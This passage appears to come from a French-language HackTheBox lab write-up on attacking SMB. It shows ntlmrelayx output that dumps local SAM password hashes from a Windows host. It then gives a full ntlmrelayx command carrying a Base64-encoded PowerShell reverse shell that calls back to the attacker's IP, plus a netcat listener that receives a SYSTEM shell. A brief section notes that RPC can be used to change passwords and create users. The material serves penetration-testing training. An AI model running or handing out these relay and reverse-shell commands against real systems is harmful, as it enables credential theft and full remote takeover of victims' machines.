[*] SMBD-Thread-5: Connection from /ADMINISTRATOR@10.10.110.1 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xeb0432b45874953711ad55884094e9d4
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92512f2605074cfc341a7f16e5fabf08:::
demouser:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 10.10.110.146
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Nous pouvons créer un reverse shell PowerShell à l'aide de https://www.revshells.com/, définir l'adresse IP de notre machine, le port et l'option Powershell #3 (Base64).

```
dsgsec@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Une fois que la victime s'est authentifiée auprès de notre serveur, nous empoisonnons la réponse et lui faisons exécuter notre commande pour obtenir un reverse shell.

```
dsgsec@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX
```

### RPC
Dans le module Empreinte, nous expliquons comment énumérer une machine à l'aide de RPC. Outre l'énumération, nous pouvons utiliser RPC pour apporter des modifications au système, telles que :
+ Modifier le mot de passe d'un utilisateur.
+ Créez un nouvel utilisateur de domaine.
+ Créez un nouveau dossier partagé.

Nous couvrons également l'énumération à l'aide de RPC dans le module Active Directory Enumeration & Attacks.

Gardez à l'esprit que certaines configurations spécifiques sont requises pour autoriser ces types de modifications via RPC. Nous pouvons utiliser la page de manuel rpclient ou SMB Access from Linux Cheat Sheet du SANS Institute pour explorer cela plus avant.